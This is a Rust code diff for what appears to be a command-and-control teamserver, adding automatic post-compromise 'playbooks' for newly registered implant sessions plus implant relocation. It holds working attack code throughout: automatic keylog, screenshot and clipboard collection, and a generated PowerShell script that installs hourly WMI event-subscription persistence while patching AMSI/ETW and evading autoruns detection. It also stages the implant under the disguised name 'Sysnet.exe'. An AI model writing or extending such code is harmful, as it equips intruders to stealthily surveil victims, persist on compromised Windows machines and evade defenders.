@@ -132,6 +132,15 @@ struct ConfigRule {
     uris: Vec<String>,
     #[serde(default)]
     user_agents: Vec<String>,
+    /// ABR-T039 onboarding playbook: task specs queued automatically the
+    /// moment a NEW session matching this rule registers — the "right
+    /// after the implant lands" flow (survey, collects, relocation)
+    /// without an operator waiting for the first check-in. Specs parse
+    /// through [`playbook_step`]; unknown or undeliverable steps are
+    /// rejected at `cfg add` time, version-gated steps are skipped (and
+    /// audited) at delivery time.
+    #[serde(default)]
+    playbook: Vec<String>,
 }
 
 #[derive(serde::Serialize, serde::Deserialize, Clone, Debug, PartialEq, Default)]
@@ -244,11 +253,191 @@ fn client_ip_of(req: &HttpRequest) -> Option<String> {
 /// Config frames go only to implants whose decoder knows kind 0x10;
 /// older builds fail the frame as malformed (strict decode).
 fn implant_supports_config(version: &str) -> bool {
+    implant_version_at_least(version, (0, 2, 1))
+}
+
+/// Parsed version comparison for capability gating: "major.minor.patch"
+/// with tolerance for missing parts (a "0" build is pre-history).
+fn implant_version_at_least(version: &str, min: (u32, u32, u32)) -> bool {
     let mut parts = version.split('.');
     let major: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
     let minor: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
     let patch: u32 = parts.next().unwrap_or("0").parse().unwrap_or(0);
-    (major, minor, patch) >= (0, 2, 1)
+    (major, minor, patch) >= min
+}
+
+// ---------------------------------------------------------------------------
+// ABR-T039: onboarding playbooks. A rule's `playbook` is a list of task
+// specs — small operator-shaped strings mirroring the mgmt verbs — that
+// the teamserver queues the moment a NEW session matching the rule
+// registers. The implant's first poll carries the whole chain; the
+// operator opens the session to survey output instead of typing the
+// survey. Delivery is once per session (session_new only), version-gated
+// per step, and every skip is audited.
+// ---------------------------------------------------------------------------
+
+/// Parses one playbook spec into a task body. `None` means "valid spec,
+/// not deliverable to THIS implant version" (the caller skips and
+/// audits). `Err` means the spec is malformed — impossible after `cfg
+/// add` validation, surfaced for direct callers.
+///
+/// Supported specs (mirroring the mgmt verbs the operator already
+/// types):
+///
+/// - `module <name> [args...]`
+/// - `collect <screenshot|clipboard|keylog>`
+/// - `sleep <secs> [jitter]`
+/// - `persist install <mechanism> <name>`
+/// - `relocate <dir> <name> [mechanism] [respawn]` (implant 0.2.2+)
+fn playbook_step(spec: &str, implant_version: &str) -> Result<Option<TaskBody>, String> {
+    let mut words = spec.split_whitespace();
+    let verb = words.next().ok_or("empty spec")?;
+    match verb {
+        "module" => {
+            let name = words.next().ok_or("module needs a name")?;
+            let args = words.collect::<Vec<_>>().join(" ");
+            Ok(Some(TaskBody::Module {
+                name: name.to_string(),
+                args,
+            }))
+        }
+        "collect" => {
+            let action = words.next().ok_or("collect needs an action")?;
+            let action = match action {
+                "screenshot" => collect_action::SCREENSHOT,
+                "clipboard" => collect_action::CLIPBOARD,
+                "keylog" => collect_action::KEYLOG_DUMP,
+                other => return Err(format!("unknown collect action '{other}'")),
+            };
+            Ok(Some(TaskBody::Collect {
+                action,
+                arg: String::new(),
+            }))
+        }
+        "sleep" => {
+            let secs: u64 = words
+                .next()
+                .ok_or("sleep needs secs")?
+                .parse()
+                .map_err(|_| "sleep secs must be an integer")?;
+            let jitter = words
+                .next()
+                .map(|j| j.parse::<f32>())
+                .transpose()
+                .map_err(|_| "bad jitter")?;
+            Ok(Some(TaskBody::Sleep {
+                secs,
+                jitter: jitter.unwrap_or(0.0),
+            }))
+        }
+        "persist" => {
+            let action = words.next().ok_or("persist needs an action")?;
+            if action != "install" {
+                return Err(format!(
+                    "playbook persist action must be install, got '{action}'"
+                ));
+            }
+            let mechanism = words.next().ok_or("persist install needs a mechanism")?;
+            let name = words.next().ok_or("persist install needs a name")?;
+            Ok(Some(TaskBody::Persist {
+                action: persist_action::INSTALL,
+                mechanism: mechanism.to_string(),
+                name: name.to_string(),
+                exe: String::new(),
+                args: String::new(),
+            }))
+        }
+        "relocate" => {
+            let dir = words.next().ok_or("relocate needs a destination dir")?;
+            let name = words.next().ok_or("relocate needs a file name")?;
+            let persist = words.next().unwrap_or("").to_string();
+            let respawn = words.next().map(|w| w == "respawn").unwrap_or(false) as u8;
+            if !implant_version_at_least(implant_version, (0, 2, 2)) {
+                return Ok(None); // deliverable spec, undeliverable build
+            }
+            Ok(Some(TaskBody::Relocate {
+                dir: dir.to_string(),
+                name: name.to_string(),
+                persist,
+                respawn,
+            }))
+        }
+        other => Err(format!(
+            "unknown playbook verb '{other}' (module, collect, sleep, persist, relocate)"
+        )),
+    }
+}
+
+/// Queues a matching rule's playbook for a freshly registered session.
+/// Called only from the session_new path, so a playbook runs exactly
+/// once per session: reconnects resume (no replay), and a relocation
+/// respawn carries the same token and resumes too (ABR-T040).
+fn deliver_playbook(state: &Arc<AppState>, live: &Arc<LiveSession>) {
+    let (domain, hostname, username, version) = {
+        let info = live.info.lock().unwrap();
+        (
+            info.domain.clone(),
+            info.hostname.clone(),
+            info.username.clone(),
+            info.implant_version.clone(),
+        )
+    };
+    let ip = live.real_ip.lock().unwrap().clone();
+    let playbook = {
+        let rules = state.config.lock().unwrap();
+        match rules.resolve(&domain, &hostname, &username, &ip) {
+            Some(rule) if !rule.playbook.is_empty() => rule.playbook.clone(),
+            _ => return,
+        }
+    };
+    let mut queued = Vec::new();
+    for spec in &playbook {
+        match playbook_step(spec, &version) {
+            Ok(Some(body)) => {
+                let kind = task_kind_name(&body).to_string();
+                let task_id = state.next_task_id.fetch_add(1, Ordering::SeqCst);
+                live.pending
+                    .lock()
+                    .unwrap()
+                    .push_back(Message::Task(Task { id: task_id, body }));
+                queued.push(json!({ "task_id": task_id, "kind": kind, "spec": spec }));
+            }
+            Ok(None) => {
+                eprintln!(
+                    "[!] session {}: playbook step '{spec}' skipped (implant {version} too old)",
+                    live.id
+                );
+                audit(
+                    state,
+                    "playbook_step_skipped",
+                    json!({ "session": live.id, "spec": spec, "implant": version }),
+                );
+            }
+            Err(e) => {
+                eprintln!(
+                    "[!] session {}: playbook step '{spec}' invalid: {e}",
+                    live.id
+                );
+                audit(
+                    state,
+                    "playbook_step_invalid",
+                    json!({ "session": live.id, "spec": spec, "error": e }),
+                );
+            }
+        }
+    }
+    if !queued.is_empty() {
+        println!(
+            "[+] session {}: onboarding playbook queued ({} step(s))",
+            live.id,
+            queued.len()
+        );
+        audit(
+            state,
+            "playbook_queued",
+            json!({ "session": live.id, "steps": queued }),
+        );
+    }
 }
 
 struct AppState {
@@ -853,6 +1042,11 @@ async fn register<S: AsyncWrite + Unpin>(
                 "addr": peer.to_string(),
             }),
         );
+        // ABR-T039: the matching rule's onboarding playbook rides the
+        // very first poll — survey output is waiting for the operator
+        // instead of a blank session. Runs on session_new only: reconnects
+        // and relocation respawns resume and never replay.
+        deliver_playbook(state, &live);
         live
     };
     // ABR-T037: resolve the implant's rule context and deliver the
@@ -1585,6 +1779,29 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
             if name.is_empty() {
                 return json!({ "error": "persist requires name" });
             }
+            // ABR-T038: WMI event-subscription persistence is composed
+            // HERE as an in-process PowerShell task (ABR-T026 machinery:
+            // AMSI/ETW patched, no wmic/powershell.exe child) instead of
+            // a raw-COM Persist task on the implant — zero implant-side
+            // plumbing, and the bootstrap already rides PowerShell tasks.
+            if mechanism == "wmi" {
+                let script = match wmi_persist_script(action, &name, &args) {
+                    Ok(s) => s,
+                    Err(e) => return json!({ "error": e }),
+                };
+                let bootstrap = match ps_bootstrap() {
+                    Ok(b) => b,
+                    Err(e) => {
+                        return json!({
+                            "error": format!(
+                                "wmi needs the PowerShell bootstrap; {e} (on a Linux teamserver seed cache/psboot.dll — see docs/usage.md)"
+                            )
+                        })
+                    }
+                };
+                return queue_task(state, &request, TaskBody::PowerShell { script, bootstrap })
+                    .await;
+            }
             queue_task(
                 state,
                 &request,
@@ -1594,6 +1811,45 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
                     name,
                     exe,
                     args,
+                },
+            )
+            .await
+        }
+        "relocate" => {
+            // ABR-T040: self-install relocation — copy the running image
+            // to a durable home, optionally arm persistence against the
+            // new copy, optionally respawn (session token handed over
+            // through the environment) and delete the stage.
+            let dir = request
+                .get("dir")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let name = request
+                .get("name")
+                .and_then(|v| v.as_str())
+                .unwrap_or("Sysnet.exe")
+                .to_string();
+            let persist = request
+                .get("persist")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            let respawn = request
+                .get("respawn")
+                .and_then(|v| v.as_bool())
+                .unwrap_or(true);
+            if dir.is_empty() {
+                return json!({ "error": "relocate requires dir" });
+            }
+            queue_task(
+                state,
+                &request,
+                TaskBody::Relocate {
+                    dir,
+                    name,
+                    persist,
+                    respawn: respawn as u8,
                 },
             )
             .await
@@ -1670,6 +1926,7 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
                                 "jitter": rule.jitter,
                                 "uris": rule.uris,
                                 "user_agents": rule.user_agents,
+                                "playbook": rule.playbook,
                             })
                         }).collect::<Vec<_>>()
                     })
@@ -1693,8 +1950,19 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
                         && rule.jitter.is_none()
                         && rule.uris.is_empty()
                         && rule.user_agents.is_empty()
+                        && rule.playbook.is_empty()
                     {
-                        return json!({ "error": "rule changes nothing (set sleep_secs, jitter, uris and/or user_agents)" });
+                        return json!({ "error": "rule changes nothing (set sleep_secs, jitter, uris, user_agents and/or playbook)" });
+                    }
+                    // A playbook that cannot parse would queue nothing at
+                    // the worst moment — the operator is away when the
+                    // implant lands. Validate every spec at add time
+                    // against a current build (version gates only matter
+                    // per registering implant).
+                    for spec in &rule.playbook {
+                        if let Err(e) = playbook_step(spec, "9.9.9") {
+                            return json!({ "error": format!("playbook spec '{spec}': {e}") });
+                        }
                     }
                     let mut rules = state.config.lock().unwrap();
                     rules.epoch += 1;
@@ -1752,6 +2020,7 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
                                 "jitter": update.jitter,
                                 "uris": update.uris,
                                 "user_agents": update.user_agents,
+                                "playbook": rule.playbook,
                             })
                         }
                         None => json!({ "matched": false }),
@@ -1947,6 +2216,80 @@ fn ps_bootstrap() -> Result<Vec<u8>, String> {
     std::fs::read(&cache).map_err(|e| format!("bootstrap read: {e}"))
 }
 
+/// Builds the PowerShell script for ABR-T038 (WMI event-subscription
+/// persistence): an hourly `Win32_LocalTime` `__EventFilter`, a
+/// `CommandLineEventConsumer` pointing at the implant copy, and the
+/// binding between them — all in `root\subscription`. The script runs
+/// through the implant's in-process runspace (ABR-T026), so installing
+/// spawns no wmic/powershell.exe child and writes no autoruns-visible
+/// value. Writing to root\subscription requires an elevated session.
+fn wmi_persist_script(action: u8, name: &str, args: &str) -> Result<String, String> {
+    if name.is_empty()
+        || !name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
+    {
+        return Err("wmi name must be [A-Za-z0-9_-]+ (it is interpolated into PowerShell)".into());
+    }
+    let args = args.replace('\'', ""); // single quotes would break the template literal
+    Ok(match action {
+        persist_action::INSTALL => format!(
+            r#"$ErrorActionPreference='Stop'
+$n='{name}'
+$t=Join-Path $env:APPDATA ($n+'.exe')
+if (!(Test-Path $t)) {{ Copy-Item -Path (Get-Process -Id $PID).Path -Destination $t -Force }}
+$f=[System.Management.ManagementClass]'\\.\root\subscription:__EventFilter'
+$fi=$f.CreateInstance()
+$fi['Name']=$n+'-flt'
+$fi['QueryLanguage']='WQL'
+$fi['Query']="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute = 0"
+$fi.Put() | Out-Null
+$c=[System.Management.ManagementClass]'\\.\root\subscription:CommandLineEventConsumer'
+$ci=$c.CreateInstance()
+$ci['Name']=$n+'-cmd'
+$ci['ExecutablePath']=$t
+$ci['CommandLineTemplate']=[char]34+$t+[char]34{arg_suffix}
+$ci.Put() | Out-Null
+$b=[System.Management.ManagementClass]'\\.\root\subscription:__FilterToConsumerBinding'
+$bi=$b.CreateInstance()
+$bi['Filter']="__EventFilter.Name='"+$n+"-flt'"
+$bi['Consumer']="CommandLineEventConsumer.Name='"+$n+"-cmd'"
+$bi.Put() | Out-Null
+Write-Output ("wmi "+$n+" installed (hourly LocalTime filter, exec "+$t+")")"#,
+            arg_suffix = if args.is_empty() {
+                String::new()
+            } else {
+                format!("+' {args}'")
+            },
+        ),
+        persist_action::REMOVE => format!(
+            r#"$n='{name}'
+# Each block is independent and null-safe: a missing object (or a WMI
+# marshaller hiccup right after the binding drop) must not abort the
+# rest, and the verdict below reports the REAL end state, not intent.
+$r=@(Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {{$_.Consumer -like '*{name}-cmd*'}})
+if($r.Count){{$r|ForEach-Object{{$_.Delete()}}}}
+$c=@(Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{name}-cmd'")
+if($c.Count){{$c|ForEach-Object{{$_.Delete()}}}}
+$f=@(Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{name}-flt'")
+if($f.Count){{$f|ForEach-Object{{$_.Delete()}}}}
+$x=Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{name}-flt'"
+$y=Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{name}-cmd'"
+Write-Output ("wmi {name} removed (filter "+$(if($x){{'PRESENT'}}else{{'gone'}})+", consumer "+$(if($y){{'PRESENT'}}else{{'gone'}})+")")"#,
+        ),
+        persist_action::LIST => format!(
+            r#"$n='{name}'
+$f=Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='{name}-flt'"
+$c=Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='{name}-cmd'"
+$b=@(Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {{$_.Consumer -like '*{name}-cmd*'}})
+'wmi-filter`t'+$(if($f){{($f.Query -replace '\s+',' ')}}else{{'-'}})
+'wmi-consumer`t'+$(if($c){{$c.CommandLineTemplate}}else{{'-'}})
+'wmi-binding`t'+$(if($b){{'bound'}}else{{'-'}})"#,
+        ),
+        other => return Err(format!("unknown persist action {other:#04x}")),
+    })
+}
+
 fn session_id_of(request: &Value) -> Option<u32> {
     request
         .get("session")
@@ -1970,6 +2313,7 @@ fn task_kind_name(body: &TaskBody) -> &'static str {
         TaskBody::Collect { .. } => "collect",
         TaskBody::Cred { .. } => "cred",
         TaskBody::ExecBof { .. } => "bof",
+        TaskBody::Relocate { .. } => "relocate",
         TaskBody::Exit => "exit",
     }
 }
@@ -2119,6 +2463,39 @@ mod tests {
     use super::*;
     use abraham_common::http::{read_response, write_request};
     use tokio::io::{AsyncReadExt, DuplexStream};
+
+    #[test]
+    fn wmi_persist_script_shapes() {
+        // Names that could break out of the interpolation are rejected.
+        assert!(wmi_persist_script(persist_action::INSTALL, "a'; rm", "").is_err());
+        assert!(wmi_persist_script(persist_action::INSTALL, "", "").is_err());
+
+        let install = wmi_persist_script(persist_action::INSTALL, "abram-lab", "-k value")
+            .expect("install script");
+        assert!(install.contains("$n='abram-lab'"));
+        assert!(install.contains("root\\subscription:__EventFilter"));
+        assert!(install.contains("root\\subscription:CommandLineEventConsumer"));
+        assert!(install.contains("root\\subscription:__FilterToConsumerBinding"));
+        // Hourly re-arm filter and the template carry the args.
+        assert!(install.contains("Win32_LocalTime' AND TargetInstance.Minute = 0"));
+        assert!(install.contains("+' -k value'"));
+
+        // Args are defused of quote breaks.
+        let quoted =
+            wmi_persist_script(persist_action::INSTALL, "n", "x'y").expect("install script 2");
+        assert!(!quoted.contains("x'y"));
+
+        let remove =
+            wmi_persist_script(persist_action::REMOVE, "abram-lab", "").expect("remove script");
+        assert!(remove.contains(".Delete()"));
+        assert!(remove.contains("Name='abram-lab-cmd'"));
+        // The verdict must report real end state, not intent.
+        assert!(remove.contains("removed (filter \"+$(if($x)"));
+
+        let list = wmi_persist_script(persist_action::LIST, "abram-lab", "").expect("list script");
+        assert!(list.contains("wmi-filter"));
+        assert!(list.contains("wmi-binding"));
+    }
 
     fn test_state(path: Option<PathBuf>, mgmt_token: Option<String>) -> Arc<AppState> {
         Arc::new(AppState {
@@ -2583,6 +2960,7 @@ mod tests {
             jitter: None,
             uris: Vec::new(),
             user_agents: Vec::new(),
+            playbook: Vec::new(),
         };
         let domain_rule = ConfigRule {
             note: "fiap".into(),
@@ -2594,6 +2972,7 @@ mod tests {
             jitter: Some(0.1),
             uris: vec!["/cdn/update".into()],
             user_agents: Vec::new(),
+            playbook: Vec::new(),
         };
         // Netblock matching, including a /16 boundary.
         assert!(net_rule.matches("x", "y", "z", "10.20.255.254"));
@@ -2795,5 +3174,160 @@ mod tests {
         let (status, body) = poll_raw(&mut client, &profile, &mut a, 8181, "Cookie").await;
         assert_eq!(status, 200);
         assert!(contains_task(&open_frames(&body, &mut a).unwrap(), 55));
+    }
+
+    #[test]
+    fn playbook_step_parses_and_gates() {
+        // Every supported spec shape parses into its task body.
+        assert_eq!(
+            playbook_step("module ps", "9.9.9").unwrap(),
+            Some(TaskBody::Module {
+                name: "ps".into(),
+                args: String::new()
+            })
+        );
+        assert_eq!(
+            playbook_step("module netstat -n", "9.9.9").unwrap(),
+            Some(TaskBody::Module {
+                name: "netstat".into(),
+                args: "-n".into()
+            })
+        );
+        assert_eq!(
+            playbook_step("collect screenshot", "9.9.9").unwrap(),
+            Some(TaskBody::Collect {
+                action: collect_action::SCREENSHOT,
+                arg: String::new()
+            })
+        );
+        assert_eq!(
+            playbook_step("sleep 30 0.25", "9.9.9").unwrap(),
+            Some(TaskBody::Sleep {
+                secs: 30,
+                jitter: 0.25
+            })
+        );
+        assert_eq!(
+            playbook_step("persist install run-key agent", "9.9.9").unwrap(),
+            Some(TaskBody::Persist {
+                action: persist_action::INSTALL,
+                mechanism: "run-key".into(),
+                name: "agent".into(),
+                exe: String::new(),
+                args: String::new()
+            })
+        );
+        // Relocate parses on current builds and is version-gated below.
+        assert_eq!(
+            playbook_step(
+                "relocate C:\\ProgramData\\Sysnet Sysnet.exe run-key respawn",
+                "0.2.2"
+            )
+            .unwrap(),
+            Some(TaskBody::Relocate {
+                dir: "C:\\ProgramData\\Sysnet".into(),
+                name: "Sysnet.exe".into(),
+                persist: "run-key".into(),
+                respawn: 1
+            })
+        );
+
+        // Malformed specs are rejected, not silently dropped.
+        assert!(playbook_step("module", "9.9.9").is_err());
+        assert!(playbook_step("collect lsass", "9.9.9").is_err());
+        assert!(playbook_step("persist remove run-key x", "9.9.9").is_err());
+        assert!(playbook_step("sleep ten", "9.9.9").is_err());
+        assert!(playbook_step("download C:\\x", "9.9.9").is_err()); // not a playbook verb
+
+        // The version gate: a pre-0.2.2 implant cannot decode RELOCATE —
+        // the step is skipped (Ok(None)), never queued blind.
+        assert_eq!(
+            playbook_step("relocate C:\\P Sysnet.exe", "0.2.1").unwrap(),
+            None
+        );
+        // Unversioned test builds are pre-history: gated too.
+        assert_eq!(
+            playbook_step("relocate C:\\P Sysnet.exe", "test").unwrap(),
+            None
+        );
+    }
+
+    /// ABR-T039: the matching rule's playbook rides the FIRST poll of a
+    /// new session, version-gated steps are skipped, and a resume NEVER
+    /// replays the chain.
+    #[tokio::test]
+    async fn playbook_rides_first_poll_and_never_replays() {
+        let (mut client, server_end) = tokio::io::duplex(64 * 1024);
+        let state = test_state(None, None);
+        let profile = Profile::default();
+        {
+            let mut rules = state.config.lock().unwrap();
+            rules.epoch += 1;
+            rules.rules.push(ConfigRule {
+                note: "lab onboarding".into(),
+                match_domain: Some("LAB".into()),
+                playbook: vec![
+                    "module survey".into(),
+                    "collect screenshot".into(),
+                    // register_info() reports version "test" — this step
+                    // must be skipped, not delivered.
+                    "relocate C:\\ProgramData\\Sys Sys.exe run-key respawn".into(),
+                ],
+                ..Default::default()
+            });
+        }
+        spawn_server(server_end, state.clone(), profile.clone());
+
+        let mut a = link(&mut client, &state, &profile, 5151).await;
+        let frames = poll(&mut client, &profile, &mut a, 5151).await;
+        let bodies: Vec<TaskBody> = frames
+            .iter()
+            .filter(|(mt, _)| *mt == msg::TASK)
+            .filter_map(
+                |(_, body)| match Message::decode(msg::TASK, body).unwrap() {
+                    Message::Task(task) => Some(task.body),
+                    _ => None,
+                },
+            )
+            .collect();
+        assert_eq!(
+            bodies,
+            vec![
+                TaskBody::Module {
+                    name: "survey".into(),
+                    args: String::new()
+                },
+                TaskBody::Collect {
+                    action: collect_action::SCREENSHOT,
+                    arg: String::new()
+                },
+            ],
+            "playbook delivers in order, relocate gated off for the old build"
+        );
+
+        // Drain done: the idle poll carries no tasks again (a 204 on
+        // 0.2.0+ builds; this "test"-version implant gets a sealed
+        // BatchEnd), and a RESUME with the same token (relocation or
+        // reconnect semantics) replays nothing — the playbook ran on
+        // session_new only.
+        let (status, body) = poll_raw(&mut client, &profile, &mut a, 5151, HDR_SESSION).await;
+        let idle = open_frames(&body, &mut a).unwrap();
+        assert!(
+            status == 204 || idle.iter().all(|(mt, _)| *mt == msg::BATCH_END),
+            "idle poll must carry no tasks (status {status})"
+        );
+        drop(client);
+
+        let (mut client2, server_end2) = tokio::io::duplex(64 * 1024);
+        let state2 = state; // same in-memory state: resume path
+        spawn_server(server_end2, state2.clone(), profile.clone());
+        let mut b = link(&mut client2, &state2, &profile, 5151).await;
+        let (status, body) = poll_raw(&mut client2, &profile, &mut b, 5151, HDR_SESSION).await;
+        let frames = open_frames(&body, &mut b).unwrap();
+        assert!(
+            frames.iter().all(|(mt, _)| *mt == msg::BATCH_END),
+            "resume never replays the playbook (status {status}, {} frames)",
+            frames.len()
+        );
     }
 }
